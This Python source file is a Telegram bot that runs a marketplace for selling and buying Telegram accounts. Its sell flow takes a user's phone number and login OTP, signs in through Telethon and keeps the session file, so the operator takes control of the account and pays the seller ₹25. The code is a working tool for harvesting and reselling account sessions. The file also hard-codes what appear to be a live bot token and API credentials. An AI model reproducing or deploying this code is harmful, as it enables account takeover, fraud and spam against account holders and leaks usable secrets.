import telebot
from telebot import types
from telethon import TelegramClient
import asyncio
import os
from flask import Flask
from threading import Thread

# --- RENDER WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "BOT IS LIVE!"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488 
LOG_CHANNEL_ID = -1003901746920 

bot = telebot.TeleBot(TOKEN)

# DATABASE
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'stock': {}, 
    'sell_rates': {'INDIA': 25}, 
    'buy_rates': {'INDIA': 40}
}
active_clients = {}

def is_admin(uid): return uid in db['admins']

# --- START MENU ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']:
        db['users'][uid] = {'balance': 0, 'referred_by': None}
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 **BALANCE**', '📥 **DEPOSIT**')
    markup.add('📤 **SELL ID**', '🛒 **BUY ID**')
    markup.add('👥 **REFERRAL**', '📞 **SUPPORT**')
    
    bot.send_message(message.chat.id, "🔥 **PRIME OTP BOT READY HAI!**\n\n**SELECT AN OPTION:**", 
                     parse_mode="Markdown", reply_markup=markup)

# --- SUPPORT FIX ---
@bot.message_handler(func=lambda message: message.text == '📞 **SUPPORT**')
def support_handler(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 **OWNER**", url="https://t.me/god_abhay"),
               types.InlineKeyboardButton("💬 **JOIN GC**", url="https://t.me/Team_quorum"))
    bot.send_message(message.chat.id, "🚩 **NEED HELP? CONTACT OWNER OR JOIN OUR GROUP:**", 
                     parse_mode="Markdown", reply_markup=markup)

# --- ADMIN PANEL ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ ADD COUNTRY", callback_data="adm_add"),
        types.InlineKeyboardButton("📢 BROADCAST", callback_data="adm_bc")
    )
    bot.send_message(message.chat.id, "👑 **OWNER PANEL**\n\nCOMMANDS:\n`/addbal ID AMT`", reply_markup=markup)

# --- SELLING SYSTEM (LOGIN + APPROVAL) ---
@bot.message_handler(func=lambda message: message.text == '📤 **SELL ID**')
def sell_init(message):
    msg = bot.send_message(message.chat.id, "📞 **ENTER NUMBER TO SELL (+91...):**")
    bot.register_next_step_handler(msg, sell_step_2)

def sell_step_2(message):
    phone = message.text.strip()
    bot.send_message(message.chat.id, "⏳ **REQUESTING OTP...**")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    active_clients[message.chat.id] = {'client': client, 'phone': phone, 'loop': loop}
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_clients[message.chat.id]['hash'] = req.phone_code_hash
        msg = bot.send_message(message.chat.id, "📩 **ENTER OTP:**")
        bot.register_next_step_handler(msg, sell_step_3)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ERROR: {e}")

def sell_step_3(message):
    otp = message.text.strip()
    data = active_clients.get(message.chat.id)
    try:
        data['loop'].run_until_complete(data['client'].sign_in(data['phone'], otp, phone_code_hash=data['hash']))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE & PAY", callback_data=f"sap_{message.from_user.id}_{data['phone']}"))
        for adm in db['admins']:
            bot.send_message(adm, f"🔔 **SELL REQ FROM {message.from_user.id}**\n📱 {data['phone']}", reply_markup=markup)
        bot.send_message(message.chat.id, "⏳ **VERIFIED! WAIT FOR ADMIN APPROVAL.**")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ FAIL: {e}")

# --- CALLBACKS & BALANCE ---
@bot.callback_query_handler(func=lambda call: True)
def handle_cb(call):
    if call.data.startswith('sap_'):
        _, uid, phone = call.data.split('_')
        uid = int(uid)
        db['users'][uid]['balance'] += 25
        bot.send_message(uid, "✅ **ID APPROVED! ₹25 ADDED.**")
        bot.edit_message_text(f"✅ PAID TO {uid}", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda message: message.text == '💰 **BALANCE**')
def bal(message):
    b = db['users'].get(message.from_user.id, {}).get('balance', 0)
    bot.send_message(message.chat.id, f"💳 **BALANCE: ₹{b}**")

if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook()
    bot.polling(none_stop=True, skip_pending=True)
